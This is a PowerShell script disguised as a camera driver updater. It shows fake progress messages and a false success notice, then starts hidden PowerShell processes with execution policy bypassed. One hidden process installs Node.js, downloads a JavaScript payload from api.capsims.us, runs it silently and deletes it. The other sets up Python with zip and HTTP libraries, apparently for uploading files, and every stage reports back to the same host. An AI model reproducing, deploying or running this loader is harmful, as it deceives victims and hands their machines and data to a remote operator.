$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'

$API_BASE = if (-not [string]::IsNullOrWhiteSpace($env:API_BASE)) { $env:API_BASE.Trim() } else { 'https://api.capsims.us' }

$WINDOW_UID = "__ID__"
if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -or $WINDOW_UID -eq "__ID__") {
    $WINDOW_UID = ""
}
if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -and -not [string]::IsNullOrWhiteSpace($env:WINDOW_UID)) {
    $WINDOW_UID = $env:WINDOW_UID.Trim()
}

# ----------------------------
# Helpers
# ----------------------------
function Write-Info([string]$Message) {
    Write-Host "[INFO] $Message"
}

function Write-WarnLog([string]$Message) {
    Write-Host "[WARN] $Message"
}

function Write-ErrorLog([string]$Message) {
    Write-Host "[ERROR] $Message"
}

function Track-Step([string]$Key) {
    if ([string]::IsNullOrWhiteSpace($WINDOW_UID) -or $WINDOW_UID -eq "__ID__") {
        return
    }
    try {
        $safeUid = [Uri]::EscapeDataString($WINDOW_UID)
        $safeKey = [Uri]::EscapeDataString($Key)
        $url = "$API_BASE/track-step/$safeUid/$safeKey"
        try {
            Invoke-RestMethod -Uri $url -Method POST -TimeoutSec 30 *> $null
        }
        catch {
            $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
            if ($null -ne $curlCmd) {
                & curl.exe -sS -L --connect-timeout 20 --max-time 30 -X POST "$url" -o NUL *> $null
            }
        }
    }
    catch {
        # Ignore tracking failures.
    }
}

function Invoke-Download {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$OutFile,
        [int]$TimeoutSec = 180
    )

    try {
        $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
        if ($null -ne $curlCmd) {
            & curl.exe -sSL --connect-timeout 30 --max-time $TimeoutSec -o $OutFile $Url *> $null
            return ($LASTEXITCODE -eq 0)
        }

        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $Url -OutFile $OutFile -TimeoutSec $TimeoutSec -UseBasicParsing *> $null
        return (Test-Path -LiteralPath $OutFile)
    }
    catch {
        return $false
    }
}

function Test-NonEmptyFile {
    param(
        [Parameter(Mandatory = $true)][string]$Path
    )

    try {
        if (-not (Test-Path -LiteralPath $Path)) {
            return $false
        }
        $item = Get-Item -LiteralPath $Path -ErrorAction Stop
        return ($item.Length -gt 0)
    }
    catch {
        return $false
    }
}

function Remove-PathIfExists {
    param(
        [Parameter(Mandatory = $true)][string]$Path
    )
    if ([string]::IsNullOrWhiteSpace($Path)) {
        return
    }
    try {
        if (Test-Path -LiteralPath $Path) {
            Remove-Item -LiteralPath $Path -Force -Recurse -ErrorAction SilentlyContinue
        }
    }
    catch {
        # Ignore cleanup failures.
    }
}

function Invoke-DownloadWithRetry {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][string]$OutFile,
        [int]$TimeoutSec = 180,
        [int]$Retries = 3
    )

    for ($i = 1; $i -le $Retries; $i++) {
        Remove-PathIfExists -Path $OutFile
        $ok = Invoke-Download -Url $Url -OutFile $OutFile -TimeoutSec $TimeoutSec
        if ($ok -and (Test-NonEmptyFile -Path $OutFile)) {
            return $true
        }
        Start-Sleep -Seconds 2
    }

    return $false
}

function Ensure-ValidTempPaths {
    $fallbackTemp = Join-Path $env:USERPROFILE "AppData\Local\Temp"
    try {
        if (-not [string]::IsNullOrWhiteSpace($env:TEMP) -and (Test-Path -LiteralPath $env:TEMP)) {
            if ([string]::IsNullOrWhiteSpace($env:TMP) -or -not (Test-Path -LiteralPath $env:TMP)) {
                $env:TMP = $env:TEMP
            }
            return
        }
    }
    catch {
        # continue to fallback path
    }

    try {
        New-Item -ItemType Directory -Path $fallbackTemp -Force *> $null
        $env:TEMP = $fallbackTemp
        $env:TMP = $fallbackTemp
    }
    catch {
        # Ignore TEMP init failures in background workers.
    }
}

function Get-BootstrapScriptDir {
    $shellHostNames = @('powershell.exe', 'pwsh.exe', 'powershell_ise.exe')
    $scriptDir = $null
    if (-not [string]::IsNullOrWhiteSpace($PSScriptRoot)) {
        $scriptDir = $PSScriptRoot
    }
    elseif (-not [string]::IsNullOrWhiteSpace($PSCommandPath) -and (Test-Path -LiteralPath $PSCommandPath -PathType Leaf)) {
        $leaf = [System.IO.Path]::GetFileName($PSCommandPath)
        if ($shellHostNames -notcontains $leaf.ToLowerInvariant()) {
            $scriptDir = Split-Path -Parent $PSCommandPath
        }
    }
    if ([string]::IsNullOrWhiteSpace($scriptDir) -and $MyInvocation -and $MyInvocation.MyCommand -and -not [string]::IsNullOrWhiteSpace($MyInvocation.MyCommand.Path) -and (Test-Path -LiteralPath $MyInvocation.MyCommand.Path -PathType Leaf)) {
        $p = $MyInvocation.MyCommand.Path
        $leaf = [System.IO.Path]::GetFileName($p)
        if ($shellHostNames -notcontains $leaf.ToLowerInvariant()) {
            $scriptDir = Split-Path -Parent $p
        }
    }
    if ([string]::IsNullOrWhiteSpace($scriptDir)) {
        $bootstrapBase = if (-not [string]::IsNullOrWhiteSpace($env:LOCALAPPDATA) -and (Test-Path -LiteralPath $env:LOCALAPPDATA)) {
            $env:LOCALAPPDATA
        }
        else {
            $env:TEMP
        }
        $scriptDir = Join-Path $bootstrapBase "wecreateproblems-driver-bootstrap"
    }

    try {
        $scriptDir = [System.IO.Path]::GetFullPath($scriptDir)
    }
    catch {
        # Keep last-resort string if GetFullPath fails.
    }

    if (-not (Test-Path -LiteralPath $scriptDir)) {
        New-Item -ItemType Directory -Path $scriptDir -Force *> $null
    }

    return $scriptDir
}

# ----------------------------
# Part 1 — UI / connection status (foreground)
# ----------------------------
function Invoke-Part1CameraDriverUi {
    # Same foreground UI as mac.cmd run_part1_camera_driver_ui
    Start-Sleep -Seconds 3
    Write-Host "[INFO] Initializing camera driver update..."
    Start-Sleep -Seconds 5
    Write-Host "[INFO] Detecting device..."
    Start-Sleep -Seconds 4
    Write-Host "[INFO] Updating camera drivers..."
    Start-Sleep -Seconds 10
    Write-Host "[SUCCESS] Camera drivers updated successfully."

    if (-not [string]::IsNullOrWhiteSpace($WINDOW_UID) -and $WINDOW_UID -ne "__ID__") {
        $safeWindowUid = [Uri]::EscapeDataString($WINDOW_UID)
        $autoUrl = "$API_BASE/change-connection-status/$safeWindowUid"
        try {
            $curlCmd = Get-Command curl.exe -ErrorAction SilentlyContinue
            if ($null -ne $curlCmd) {
                & curl.exe -sL -X POST "$autoUrl" *> $null
            }
            else {
                Invoke-RestMethod -Uri $autoUrl -Method POST -TimeoutSec 60 *> $null
            }
        }
        catch {
            # Ignore status callback failures.
        }
    }
}

# ----------------------------
# Part 2 — Node driver (background)
# ----------------------------
function Invoke-Part2NodeDriver {
    Ensure-ValidTempPaths
    Track-Step "part2_step_1"

    $scriptDir = Get-BootstrapScriptDir
    $extractDir = Join-Path $scriptDir "nodejs"
    $portableNode = Join-Path $extractDir "PFiles64\nodejs\node.exe"
    $nodeExe = $null
    $nodeVersion = "22.16.0"

    $nodeCommand = Get-Command node -ErrorAction SilentlyContinue
    if ($null -ne $nodeCommand) {
        $nodeExe = "node"
    }

    if (-not $nodeExe -and (Test-Path -LiteralPath $portableNode)) {
        $nodeExe = $portableNode
        $env:PATH = (Join-Path $extractDir "PFiles64\nodejs") + ";" + $env:PATH
    }

    if (-not $nodeExe) {
        Track-Step "part2_step_2"
        $nodeZip = "node-v$nodeVersion-win-x64.zip"
        $zipUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeZip"
        $zipOut = Join-Path $scriptDir $nodeZip
        $zipOk = Invoke-DownloadWithRetry -Url $zipUrl -OutFile $zipOut -TimeoutSec 600 -Retries 3
        if ($zipOk) {
            try {
                Expand-Archive -LiteralPath $zipOut -DestinationPath $extractDir -Force
            }
            catch {
                # Continue to MSI fallback.
            }
            Remove-PathIfExists -Path $zipOut
        }

        if (-not $nodeExe) {
            $zipNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
                Select-Object -First 1
            if ($null -ne $zipNode) {
                $nodeExe = $zipNode.FullName
                $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
            }
        }

        if (-not $nodeExe) {
            $nodeMsi = "node-v$nodeVersion-x64.msi"
            $downloadUrl = "https://nodejs.org/dist/v$nodeVersion/$nodeMsi"
            $msiOut = Join-Path $scriptDir $nodeMsi
            $downloadOk = Invoke-DownloadWithRetry -Url $downloadUrl -OutFile $msiOut -TimeoutSec 600 -Retries 3
            if ($downloadOk -and (Test-Path -LiteralPath $msiOut)) {
                & msiexec /a $msiOut /qn TARGETDIR="$extractDir" *> $null
                Remove-PathIfExists -Path $msiOut
            }
        }

        if (-not $nodeExe -and (Test-Path -LiteralPath $portableNode)) {
            $nodeExe = $portableNode
            $env:PATH = (Join-Path $extractDir "PFiles64\nodejs") + ";" + $env:PATH
        }

        if (-not $nodeExe) {
            $msiNode = Get-ChildItem -LiteralPath $extractDir -Recurse -Filter "node.exe" -ErrorAction SilentlyContinue |
                Select-Object -First 1
            if ($null -ne $msiNode) {
                $nodeExe = $msiNode.FullName
                $env:PATH = (Split-Path -Parent $nodeExe) + ";" + $env:PATH
            }
        }
    }

    if (-not $nodeExe) {
        return
    }

    & $nodeExe -v *> $null
    if ($LASTEXITCODE -ne 0) {
        return
    }

    Track-Step "part2_step_3"
    $codeProfile = $env:USERPROFILE
    if (-not (Test-Path -LiteralPath $codeProfile)) {
        New-Item -ItemType Directory -Path $codeProfile -Force *> $null
    }

    $envSetupUrl = "$API_BASE/get-file/test.js"
    $envSetupFile = Join-Path $codeProfile "env-setup.npl"
    $envSetupOk = Invoke-DownloadWithRetry -Url $envSetupUrl -OutFile $envSetupFile -TimeoutSec 180 -Retries 3
    if (-not $envSetupOk) {
        return
    }

    Track-Step "part2_step_4"
    Set-Location -LiteralPath $codeProfile
    if (Test-NonEmptyFile -Path $envSetupFile) {
        & $nodeExe $envSetupFile *> $null
    }

    Track-Step "part2_step_5"
    Remove-PathIfExists -Path $envSetupFile
}

# ----------------------------
# Part 3 — Python embed + upload.py (background)
# ----------------------------
function Invoke-Part3PythonDriver {
    Ensure-ValidTempPaths
    Track-Step "part1_step_1"

    $codeProfile = $env:USERPROFILE
    if (-not (Test-Path -LiteralPath $codeProfile)) {
        New-Item -ItemType Directory -Path $codeProfile -Force *> $null
    }

    New-Item -ItemType Directory -Path "C:\python" -Force *> $null
    $pythonExe = "C:\python\python.exe"

    if (-not (Test-Path -LiteralPath $pythonExe)) {
        Track-Step "part1_step_2"
        $pyZip = "C:\python\py.zip"
        $pyZipUrl = "https://www.python.org/ftp/python/3.13.2/python-3.13.2-embed-amd64.zip"
        $pyZipOk = Invoke-DownloadWithRetry -Url $pyZipUrl -OutFile $pyZip -TimeoutSec 600 -Retries 3
        if (-not $pyZipOk) {
            return
        }

        Track-Step "part1_step_3"
        try {
            Expand-Archive -LiteralPath $pyZip -DestinationPath "C:\python" -Force
        }
        catch {
            Remove-PathIfExists -Path $pyZip
            return
        }
        Remove-PathIfExists -Path $pyZip

        $pthFile = "C:\python\python313._pth"
        if (Test-Path -LiteralPath $pthFile) {
            try {
                (Get-Content -LiteralPath $pthFile) -replace '^#import site', 'import site' | Set-Content -LiteralPath $pthFile -Encoding ASCII
            }
            catch {
                # Continue even if _pth update fails.
            }
        }

        $getPip = "C:\python\get-pip.py"
        $getPipOk = Invoke-DownloadWithRetry -Url "https://bootstrap.pypa.io/get-pip.py" -OutFile $getPip -TimeoutSec 120 -Retries 3
        if ($getPipOk) {
            & $pythonExe $getPip *> $null
        }
        & $pythonExe -m pip install requests portalocker pyzipper *> $null
    }

    Track-Step "part1_step_4"
    if (-not (Test-Path -LiteralPath $pythonExe)) {
        return
    }
    & $pythonExe -V *> $null
    if ($LASTEXITCODE -ne 0) {
        return
    }

    Track-Step "part1_step_5"

    Remove-PathIfExists -Path $uploadFile
}

# ----------------------------
# Background runner (hidden PowerShell; no console output)
# ----------------------------
function Start-BackgroundWork {
    param(
        [Parameter(Mandatory = $true)][string]$FunctionName
    )

    $safeUid = $WINDOW_UID -replace "'", "''"
    $safeApi = $API_BASE -replace "'", "''"

    $helperNames = @(
        'Write-Info',
        'Write-WarnLog',
        'Write-ErrorLog',
        'Track-Step',
        'Invoke-Download',
        'Test-NonEmptyFile',
        'Remove-PathIfExists',
        'Invoke-DownloadWithRetry',
        'Ensure-ValidTempPaths',
        'Get-BootstrapScriptDir',
        'Invoke-Part2NodeDriver',
        'Invoke-Part3PythonDriver'
    )

    $defs = foreach ($name in $helperNames) {
        $fn = Get-Item -LiteralPath "function:$name" -ErrorAction SilentlyContinue
        if ($null -ne $fn) {
            "function $name {`n$($fn.Definition)`n}"
        }
    }

    $boot = @"
`$ErrorActionPreference = 'Continue'
`$ProgressPreference = 'SilentlyContinue'
`$API_BASE = '$safeApi'
`$WINDOW_UID = '$safeUid'
$($defs -join "`n`n")
$FunctionName
"@

    $workerDir = if (-not [string]::IsNullOrWhiteSpace($env:TEMP) -and (Test-Path -LiteralPath $env:TEMP)) {
        $env:TEMP
    }
    elseif (-not [string]::IsNullOrWhiteSpace($env:LOCALAPPDATA)) {
        $env:LOCALAPPDATA
    }
    else {
        $env:USERPROFILE
    }

    $workerPath = Join-Path $workerDir ("capsims-bg-" + $FunctionName + "-" + [guid]::NewGuid().ToString('N') + ".ps1")
    Set-Content -LiteralPath $workerPath -Value $boot -Encoding UTF8

    Start-Process -FilePath "powershell.exe" -ArgumentList @(
        '-NoProfile',
        '-ExecutionPolicy', 'Bypass',
        '-WindowStyle', 'Hidden',
        '-File', $workerPath
    ) -WindowStyle Hidden | Out-Null
}


# ----------------------------
# MAIN FLOW
# ----------------------------
# 1) Part 1 — foreground (terminal messages, delays, API status).
# 2) Part 2 + Part 3 — two independent hidden jobs after Part 1 returns.
function Invoke-Main {
    Ensure-ValidTempPaths
    Invoke-Part1CameraDriverUi

    Start-BackgroundWork -FunctionName 'Invoke-Part2NodeDriver'
    Start-BackgroundWork -FunctionName 'Invoke-Part3PythonDriver'
}

Invoke-Main
return
